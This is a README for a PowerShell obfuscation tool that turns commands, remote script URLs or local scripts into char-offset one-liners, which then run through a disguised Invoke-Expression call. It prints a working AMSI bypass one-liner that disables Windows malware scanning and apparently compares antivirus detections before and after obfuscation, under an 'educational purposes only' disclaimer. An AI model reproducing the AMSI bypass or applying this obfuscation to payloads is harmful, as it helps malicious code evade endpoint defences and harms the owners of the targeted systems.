# Invoke-Mathfuscation

![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscation.png)

A quick command line utility that converts individual characters of an input string into char values. It then takes a user-supplied number value and uses it to ofuscate the individual char values. Lastly, it outputs a simple obfuscated one-liner using random polymorphic variables which will execute the original string. Currently supports:

* Remote URL (ie: http://example.com/dir/remote.ps1)
* Local File (ie: C:\tmp\local.ps1)
* PowerShell Command

When prompted, specify a command to invoke, remote URL or full local path to a .ps1 file, then supply the number offset which will be added to the char values. 

Example: 
```Write-Host "Hello world!"``` using 6000 as an offset:
```powershell
@(6087,6114,6105,6116,6101,6045,6072,6111,6115,6116,6032,6034,6072,6101,6108,6108,6111,6032,6119,6111,6114,6108,6100,6033,6034)| % {$wdAQf=$wdAQf+[char]($_-6000)};.(gcm ?e[?x])($wdAQf)
```

# VirusTotal Detections

Example: AMSI Bypass using Using Matt Graebers Reflection method:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Unmathfuscated:
![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscate_amsi_bypass_1.png)

Mathfuscated:
![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscate_amsi_bypass_2.png)



*Disclaimer: I'm not a programmer*

Use at your own risk! For educational purposes only. 


